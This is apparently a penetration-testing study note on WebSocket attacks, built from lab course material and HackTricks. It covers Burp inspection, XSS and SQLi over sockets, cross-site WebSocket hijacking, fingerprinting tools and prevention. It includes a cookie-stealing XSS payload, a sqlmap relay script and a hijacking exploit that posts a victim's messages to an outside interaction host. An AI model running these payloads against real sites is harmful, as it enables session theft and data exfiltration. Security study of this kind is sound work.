---
technique: "WebSocket Attacks"
family: "client-side"
severity_hint: "medium"
tags: ["Web Sockets", "HTTP", "XSS", "SQL Injection", "Account Takeover"]
source: "_raw/Web attacks/Web Attacks/WebSocket Attacks.md"
curator_version: 2
review_status: imported-unreviewed
---

# WebSocket Attacks

> Family: **client-side** · Severity hint: **medium** · Tags: Web Sockets, HTTP, XSS, SQL Injection, Account Takeover
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: curl, python3.

## Overview

WebSocket connections carry the same injection risks as HTTP (XSS, SQLi, and beyond) if data crossing the socket isn't sanitized, and the handshake itself can be hijacked cross-origin (CSWH) when the server doesn't validate the `Origin` header. Burp's WebSockets history and Repeater cover manual inspection and replay, while dedicated CLI tools (`websocat`, `STEWS`) handle scripted interaction, fingerprinting, and vulnerability detection.

## Analysis in Burp

**Inspecting Messages**

- Inspect data sent over WebSocket connections in the `WebSockets history` tab within the `Proxy`

**Manipulating, Injecting, and Replaying Messages**

- Same as with normal http requests
- We can also use repeater as usually (either to server or to client)
- Burp also enables us to manipulate the WebSocket handshake, disconnect existing WebSocket connections, or establish new WebSocket connections
    - To do so, send any WebSocket message to Repeater. Afterward, we can disconnect the existing connection and re-connect by clicking the same icon
- To manipulate the handshake, click on the little pencil icon
    - Burp displays an overview of all past WebSocket connections and some meta information
    - We can select a different WebSocket connection for the message in Repeater and click `Attach` to send the message in the selected connection
    - Furthermore, we can click `clone` to establish a new WebSocket connection to the same server

## Other Attacks via WebSockets

### XSS

- We can inject XSS payloads via the websockets if not sanitized correctly
- For example when we send messages in a chat app to other users

```bash
<img/src/onerror="socket.send(document.cookie)">
```

### SQLi

[https://github.com/BKreisel/sqlmap-websocket-proxy](https://github.com/BKreisel/sqlmap-websocket-proxy)

- When we instead of sending messages to other users display messages on the page directly
- [sqlmap](https://sqlmap.org/) has problems with websockets sometimes
    - Write a middleware that takes the SQLi payload from sqlmap, open a websocket, forward the payload
    - Example

        ```python
        from flask import Flask, request
        from websocket import create_connection
        import json

        app = Flask(__name__)

        WS_URL = 'ws://172.17.0.2/dbconnector'

        @app.route('/')
        def index():
            req = {}
            req['username'] = request.args.get('username', '')

            ws = create_connection(WS_URL)
            ws.send(json.dumps(req))
            r = json.loads(ws.recv())
            ws.close()

            if r.get('error'):
                return r['error']

            return r['messages']

        app.run(host='127.0.0.1', port=8000)
        ```

    - `sqlmap -u http://127.0.0.1:8000/?username=htb-stdnt`

> Note: We can attempt supplying the WebSocket URL directly to sqlmap.

> Note: While we've demonstrated the exploitation of XSS and SQLi over WebSockets, it's worth noting that similar techniques can be applied to exploit other prevalent web vulnerabilities, including Command Injection or Local File Inclusion (LFI).

### CSWH

https://christian-schneider.net/blog/cross-site-websocket-hijacking/

- Vulnerablillity resulting from `CSRF` attack on the handshake
- Due to `SOP` regular CSRF attacks can not access the response
    - WebSockets however can
    - Not as strictly bound to SOP as HTTP requests
- Provide attackers with read access to data sent over WebSocket

**Identifying the Vulnerability**

- Example

    ```python
    @sock.route('/messages')
    def messages(sock):
        if not session.get('logged_in'):
            sock.send('{"error":"Unauthorized"}')
            return

        while True:
            response = {}

            try:
                data = sock.receive(timeout=1)
                if not data == '!get_messages':
                    continue

                username = session.get('user', '')
                messages = fetch_messages(username)

                if not messages:
                    response['error'] = "No messages for this user!"
                else:  
                    response['messages'] = [msg[0] for msg in messages]

                sock.send(json.dumps(response))

            except Exception as e:
                response['error'] = "An error occured!"
                sock.send(json.dumps(response))
    ```

    - There are no additional protections to protect from CSRF attacks, such as checking for CSRF tokens or validating the `Origin` header. Therefore, the web application is vulnerable to CSRF attacks on the WebSocket handshak
    - We can initiate a new WebSocket connection and provide a different `Origin` header to confirm the vulnerability, imitating a cross-origin request

    ```python
    GET /messages HTTP/1.1
    Host: 172.17.0.2:80
    Connection: Upgrade
    Upgrade: websocket
    Origin: http://crossdomain.htb
    Sec-WebSocket-Version: 13
    Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXIiOiJodGItc3RkbnQifQ.ZEQwlQ.ZoJ2yDD1Ujx5wzp54vXWN97j1LM
    Sec-WebSocket-Key: 7QpTshdCiQfiv3tH7myJ1g==
    ```

    - If we now send the message `!get_messages` via the WebSocket connection, the server responds with the messages for our user just like it did before, thus proving a CSWH vulnerability

**Exploitation**

```jsx
<script>
  function send_message(event){
    socket.send('!get_messages');
  };

  const socket = new WebSocket('ws://172.17.0.2:80/messages');
  socket.onopen = send_message;
  socket.addEventListener('message', ev => {
    fetch('http://ch23a202vtc0000138p0getbibyyyyyyb.oast.fun/', {method: 'POST', mode: 'no-cors', body: ev.data});
  });
</script>
```

- *The admin user of the vulnerable web application visits `cwshpayload.htb`*
- *The exploit code runs, creating the WebSocket connection to the vulnerable site in the context of the admin user and exfiltrates the admin's messages to `interact.sh`*
- In real-world scenarios, we might need to send multiple messages to the server and react dynamically to the web server's messages
- However, this is not a problem since the Same-Origin policy does not apply

> Note: For this exploit to work, the `SameSite` cookie flag must be set to `None`. Since most browsers apply a default value of `Lax` if the `SameSite` cookie attribute is not set, the attack's success would require a deliberately insecure configuration by the web application administrator.

## Tools & Prevention

### Tools - Interacting with WebSockets

Instead of using Burp to manipulate and replay WebSocket messages, command-line tools such as [wscat](https://github.com/websockets/wscat) and [websocat](https://github.com/vi/websocat) provide similar functionality. We will showcase `websocat` here, but feel free to play around with both tools and choose which one you prefer.

We can install `websocat` by downloading a precompiled binary from the [GitHub repository](https://github.com/vi/websocat/releases/tag/v1.11.0); on the default `PwnBox` instance, we need the `websocat_max.x86_64-unknown-linux-musl` build.

Afterward, we have to make the binary executable and run it:

```
htb-student@htb[/htb]$ chmod +x websocat_max.x86_64-unknown-linux-muslhtb-student@htb[/htb]$ ./websocat_max.x86_64-unknown-linux-musl -hwebsocat 1.11.0
Vitaly "_Vi" Shukela <vi0oss@gmail.com>
Command-line client for web sockets, like netcat/curl/socat for ws://.

USAGE:
    websocat ws://URL | wss://URL               (simple client)
    websocat -s port                            (simple server)
    websocat [FLAGS] [OPTIONS] <addr1> <addr2>  (advanced mode)
<SNIP>
```

We can specify a WebSocket URL for the tool to connect to:

```
htb-student@htb[/htb]$ ./websocat_max.x86_64-unknown-linux-musl ws://172.17.0.2/echoHello EchoServer!
Hello EchoServer!
```

For more advanced features, check out the tool's help menu by running the command `websocat --help=long`.

### Tools - Vulnerability Detection

[Security Testing and Enumeration of WebSockets (STEWS)](https://github.com/PalindromeLabs/STEWS) is a tool suite that can help us fingerprint and identify WebSocket libraries and test for CSWH vulnerabilities. We will focus on the fingerprinting and vulnerability detection modules provided in the `fingerprint` and `vuln-detect` directories.

**Fingerprinting**

To use the `fingerprinting` module, we change directories to `fingerprint` and then install the dependencies using `pip`:

```
htb-student@htb[/htb]$ pip3 install -r requirements.txt
```

Subsequently, we can run the tool using Python:

```
htb-student@htb[/htb]$ python3 STEWS-fingerprint.py -husage: STEWS-fingerprint.py [-h] [-v] [-d] [-u URL] [-f FILE] [-n] [-k] [-o ORIGIN] [-g] [-a] [-1] [-2] [-3] [-4] [-5] [-6] [-7]

Security Testing and Enumeration of WebSockets (STEWS) Fingerprinting Tool

optional arguments:
  -h, --help            show this help message and exit
  -v, --verbose         Enable verbose tracing of communications
  -d, --debug           Print each test case to track progress while running
  -u URL, --url URL     Provide a URL to connect to
  -f FILE, --file FILE  Provide a file containing URLs to check for valid WebSocket connections
  -n, --no-encryption   Connect using ws://, not wss:// (default is wss://)
  -k, --nocert          Ignore invalid SSL cert
  -o ORIGIN, --origin ORIGIN
                        Set origin
  -g, --generate-fingerprint
                        Generate a fingerprint for a known server
  -a, --all-tests       Run all tests
  -1, --series-100      Run the 100-series (opcode) tests
  -2, --series-200      Run the 200-series (rsv bit) tests
  -3, --series-300      Run the 300-series (version) tests
  -4, --series-400      Run the 400-series (extensions) tests
  -5, --series-500      Run the 500-series (subprotocols) tests
  -6, --series-600      Run the 600-series (long payloads) tests
  -7, --series-700      Run the 700-series (hybi and similar) tests
```

`STEWS` tests and analyzes different properties of a WebSocket connection to try and determine the specific implementation used by the web server. Knowing the exact WebSocket implementation allows attackers to prepare specialized attacks that target it. We can run `STEWS` with all tests using the `-a` flag or specify a subset of tests using the `-1` through `-7` flags. The tool expects the URL passed in the `-u` parameter not to contain the scheme (i.e., no `http://` or `https://`).

As an example, let us run the tool's series `5` tests on the CSWH lab from the previous section:

```
htb-student@htb[/htb]$ python3 STEWS-fingerprint.py -u websockets.htb/messages -n -5=======================================================
Identifying...
=======================================================
List of deltas between detected fingerprint and those in database
[2, 0, 0, 2, 0, 0, 2, 0]
=======================================================
>>>Most likely server: Faye, Gorilla, Java Spring boot, Python websockets, Python Tornado -- % match: 100.0
>>>Second most likely server: NodeJS ws, uWebSockets, Ratchet -- % match: 0.0
=======================================================
Most likely server's fingerprint:
{'100': 1, '101': 1, '102': 0, '103': 0, '104': 'Received unexpected continuation frame', '105': 1, '200': 'One or more reserved bits are on: reserved1 = 0, reserved2 = 0, reserved3 = 1', '201': 'One or more reserved bits are on: reserved1 = 0, reserved2 = 0, reserved3 = 1', '202': 'One or more reserved bits are on: reserved1 = 0, reserved2 = 0, reserved3 = 1', '203': 'One or more reserved bits are on: reserved1 = 0, reserved2 = 0, reserved3 = 1', '204': 'One or more reserved bits are on: reserved1 = 0, reserved2 = 0, reserved3 = 1', '205': 'One or more reserved bits are on: reserved1 = 0, reserved2 = 0, reserved3 = 1', '206': 'One or more reserved bits are on: reserved1 = 0, reserved2 = 0, reserved3 = 1', '300': 1, '301': 1, '302': 1, '303': 1, '304': 1, '305': 1, '306': 0, '307': 1, '308': 1, '309': 0, '310': 0, '400': 0, '401': 0, '402': 0, '403': 0, '404': 0, '405': 0, '500': 0, '501': 0, '600': 1, '601': 1, '602': 1, '603': 1, '604': 1, '605': 1, '606': 1, '607': 1, '608': 0, '609': 0, '610': 0, '611': 0, '612': 0, '700': 'Unsupported WebSocket version', '701': 'Not a WebSocket request', '702': '400', '703': '101', '704': 'yTFHc]O', '705': '101'}
=======================================================
Tested server's fingerprint:
{'500': 0, '501': 0}
```

We can see that `STEWS` determined the WebSocket implementation to be one of the following: `Faye`, `Gorilla`, `Java Spring boot`, `Python websockets`, or `Python Tornado`.

However, the actual WebSocket implementation belongs to the `flask_sock` Python package; however, since it is unknown to `STEWS`, it cannot determine the library correctly. We can confirm this by running a different test series and observing an entirely different result:

```
htb-student@htb[/htb]$ python3 STEWS-fingerprint.py -u websockets.htb/messages -n -4=======================================================
Identifying...
=======================================================
List of deltas between detected fingerprint and those in database
[6, 6, 6, 6, 0, 6, 6, 6]
=======================================================
>>>Most likely server: Java Spring boot -- % match: 100.0
>>>Second most likely server: NodeJS ws, Faye, Gorilla, uWebSockets, Python websockets, Ratchet, Python Tornado -- % match: 0.0
=======================================================
Most likely server's fingerprint:
{'100': 0, '101': 0, '102': 0, '103': 0, '104': 'A WebSocket frame was sent with an unrecognised opCode of [0]', '105': 'The client sent a close frame with a single byte payload which is not valid', '200': 'The client frame set the reserved bits to [1] for a message with opCode [2] which was not supported by this endpoint', '201': 'The client frame set the reserved bits to [1] for a message with opCode [2] which was not supported by this endpoint', '202': 'The client frame set the reserved bits to [1] for a message with opCode [2] which was not supported by this endpoint', '203': 'The client frame set the reserved bits to [1] for a message with opCode [2] which was not supported by this endpoint', '204': 'The client frame set the reserved bits to [1] for a message with opCode [2] which was not supported by this endpoint', '205': 'The client frame set the reserved bits to [1] for a message with opCode [2] which was not supported by this endpoint', '206': 'The client frame set the reserved bits to [1] for a message with opCode [2] which was not supported by this endpoint', '300': 0, '301': 0, '302': 0, '303': 0, '304': 0, '305': 0, '306': 1, '307': 0, '308': 0, '309': 0, '310': 0, '400': 'permessage-deflate', '401': 'permessage-deflate', '402': 'permessage-deflate', '403': 'permessage-deflate', '404': 'permessage-deflate', '405': 'permessage-deflate', '500': 0, '501': 0, '600': 0, '601': 0, '602': 0, '603': 0, '604': 0, '605': 0, '606': 0, '607': 0, '608': 0, '609': 0, '610': 0, '611': 0, '612': 0, '700': '426', '701': 'Can "Upgrade" only to "WebSocket".', '702': 'Bad Request', '703': '403', '704': 'Bad Request', '705': 'Bad Request'}
=======================================================
Tested server's fingerprint:
{'400': 'permessage-deflate', '401': 'permessage-deflate', '402': 'permessage-deflate', '403': 'permessage-deflate', '404': 'permessage-deflate', '405': 'permessage-deflate'}
```

**Vulnerability Detection**

Similar to the `fingerprinting` module, we need to install the dependencies for the `vulnerability detection` module using `pip`. Afterward, we can run `STEWS` to test for CSWH vulnerabilities and some public vulnerabilities in specific WebSocket implementations.

```
htb-student@htb[/htb]$ python3 STEWS-vuln-detect.py -husage: STEWS-vuln-detect.py [-h] [-v] [-d] [-u URL] [-f FILE] [-n] [-k] [-o ORIGIN] [-1] [-2] [-3] [-4]

Security Testing and Enumeration of WebSockets (STEWS) Vulnerability Detection Tool

optional arguments:
  -h, --help            show this help message and exit
  -v, --verbose         Enable verbose tracing of communications
  -d, --debug           Print each test case to track progress while running
  -u URL, --url URL     URL to connect to
  -f FILE, --file FILE  File containing URLs to check for valid WebSocket connections
  -n, --no-encryption   Connect using ws://, not wss:// (default is wss://)
  -k, --nocert          Ignore invalid SSL cert
  -o ORIGIN, --origin ORIGIN
                        Set origin
  -1                    Test for generic Cross-site WebSocket Hijacking (CSWSH)
  -2                    Test CVE-2021-32640 - ws Sec-Websocket-Protocol Regex DoS
  -3                    Test CVE-2020-7662 & 7663 - faye Sec-WebSocket-Extensions Regex DoS
  -4                    Test CVE-2020-27813 - Gorilla DoS Integer Overflow
```

Again, we will use `STEWS` on the CSWH lab from the previous section to check if it can identify the CSWH vulnerability:

```
htb-student@htb[/htb]$ python3 STEWS-vuln-detect.py -n -u websockets.htb/messages -1   Testing ws://websockets.htb/messages
>>>Note: ws://websockets.htb/messages allowed http or https for origin
>>>Note: ws://websockets.htb/messages allowed null origin
>>>Note: ws://websockets.htb/messages allowed unusual char (possible parse error)
>>>VANILLA CSWSH DETECTED: ws://websockets.htb/messages likely vulnerable to vanilla CSWSH (any origin)
====Full list of vulnerable URLs===
['ws://websockets.htb/messages']
['>>>VANILLA CSWSH DETECTED: ws://websockets.htb/messages likely vulnerable to vanilla CSWSH (any origin)']
```

As we can see from the output, `STEWS` correctly identified the CSWH vulnerability; however, it only checks different origins. Therefore, it cannot determine CSWH vulnerabilities that do not rely on checking the `Origin` header. To get more details about the requests sent, we can add the debug flag `-d`:

```
htb-student@htb[/htb]$ python3 STEWS-vuln-detect.py -n -u websockets.htb/messages -1 -d<SNIP>
-----------START-----------
GET http://websockets.htb/messages
Upgrade: websocket
Origin: null
Sec-WebSocket-Key: U2NqiNJpRpRGdvagcfySUA==
Connection: Upgrade
Sec-WebSocket-Version: 13

Response status code: 101
-----------START-----------
GET http://websockets.htb/messages
Upgrade: websocket
Origin: https://websockets.htb`google.com
Sec-WebSocket-Key: U2NqiNJpRpRGdvagcfySUA==
Connection: Upgrade
Sec-WebSocket-Version: 13

Response status code: 101
<SNIP>
```

For more details on WebSocket security, check out [this](https://github.com/PalindromeLabs/awesome-websocket-security) GitHub repository.

### Prevention

Different WebSocket vulnerabilities have different methods of prevention. Preventing the CSRF attack on the WebSocket handshake prevents CSWH attacks. Potential countermeasures include checking the [Origin header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin), implementing CSRF tokens, or secure configuration of the [SameSite](https://web.dev/i18n/en/samesite-cookies-explained/) cookie flag.

Furthermore, there are some general security considerations we should follow when implementing WebSocket connections:

- Always prefer the `wss://` scheme over `ws://` due to the security provided by TLS
- Sanitize data received over WebSocket connections accordingly, just like we sanitize data received in HTTP requests. The sanitization needs to correspond to the purpose of the data received, for instance, if used in SQL queries or inserted into the DOM to prevent XSS. In particular, the data needs to be treated as untrusted in both directions, i.e., the server should not trust data received by the client, and the client should not trust data received by the server

## HackTricks methodology enrichment

### Identify the application protocol

Do not treat every text frame as an ad-hoc JSON API. Record the handshake URL,
subprotocol, extensions, authentication material, first server frame, heartbeat,
and close codes. Look for Socket.IO/Engine.IO framing and messaging protocols
such as STOMP, MQTT, or AMQP carried over WebSocket; their destinations,
subscriptions, acknowledgements, and broker ACLs create additional authorization
boundaries.

For Socket.IO, preserve the Engine.IO session setup and heartbeat cadence before
replaying events. Mutate one event name, namespace, room, object identifier, or
argument at a time, then compare the durable server-side result across the role
matrix.

### Cross-site and lifecycle checks

- Test the handshake with an untrusted `Origin`, `Origin: null`, missing Origin,
  and a same-site sibling origin. Confirm whether ambient cookies or other browser
  credentials are sent and accepted; an origin difference without authenticated
  impact is only a lead.
- Verify authorization independently for connect, subscribe/join, publish/send,
  and object-level actions. Recheck an existing connection after logout, role
  downgrade, account disablement, and token expiry.
- Compare HTTP and WebSocket implementations of the same action for validation,
  rate-limit, and audit-log parity. Keep message counts within the engagement
  budget and avoid malformed-frame/availability testing unless explicitly
  authorized.

HackTricks source: [WebSocket Attacks](https://hacktricks.wiki/en/pentesting-web/websocket-attacks.html)
([snapshot reviewed](https://github.com/HackTricks-wiki/hacktricks/blob/d7dfcf8fa88bc49160a0fec341b16c763660ee4f/src/pentesting-web/websocket-attacks.md)).

## Source
Original notes:
- `_raw/Web attacks/Web Attacks/WebSocket Attacks.md`
- `_raw/Web attacks/Web Attacks/WebSocket Attacks/WebSocket Analysis in Burp.md`
- `_raw/Web attacks/Web Attacks/WebSocket Attacks/Other attacks via WebSockets.md`
- `_raw/Web attacks/Web Attacks/WebSocket Attacks/Tools & Prevention.md`
